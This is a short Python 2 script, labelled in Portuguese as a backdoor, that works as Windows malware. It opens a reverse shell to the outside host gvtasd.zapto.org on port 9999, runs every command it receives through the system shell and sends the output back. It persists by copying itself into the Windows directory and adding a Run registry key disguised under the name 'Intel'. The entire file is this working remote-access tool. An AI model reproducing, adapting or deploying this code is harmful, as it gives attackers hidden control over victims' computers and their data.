#backdoor do bill 1.0
import socket
import os
import shutil
import _winreg
import subprocess
import time
resposta = False
def nada():
      try:
        s = socket.socket()
        s.connect(("gvtasd.zapto.org",9999))
      except:
         time.sleep(5)
         server()
def server():
    global resposta
    try:
        s = socket.socket()
        s.connect(("gvtasd.zapto.org",9999))
    except:
        time.sleep(5)
    while True:
        try:
            s.send(">")
        except:
            time.sleep(5)
        try:
            resposta = s.recv(1024)
        except:
            while not resposta:
                nada()
        p = subprocess.Popen(resposta, shell=True, bufsize=255, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,close_fds=False)
        resposta = False
        resultado = p.stdout.read() #saida padrao da shell vai ser armazenada aqui
        if not resultado: #se nao ouver saida padrao verificar se tem erro
            resultado = p.stderr.read()
        s.send(resultado)
    s.close()  
def install():
    File = os.environ['windir'] + '\\reverse.pyw'
    try:
        shutil.copy(os.getcwd() + "\\reverse.pyw",os.environ['windir'])
    except:
        server()
    keyp = _winreg.OpenKey( _winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\Windows\\CurrentVersion\\Run',0, _winreg.KEY_SET_VALUE)
    _winreg.SetValueEx (keyp, 'Intel', 0, _winreg.REG_SZ, File)
    _winreg.CloseKey(keyp)
    return True
install()
server()

    
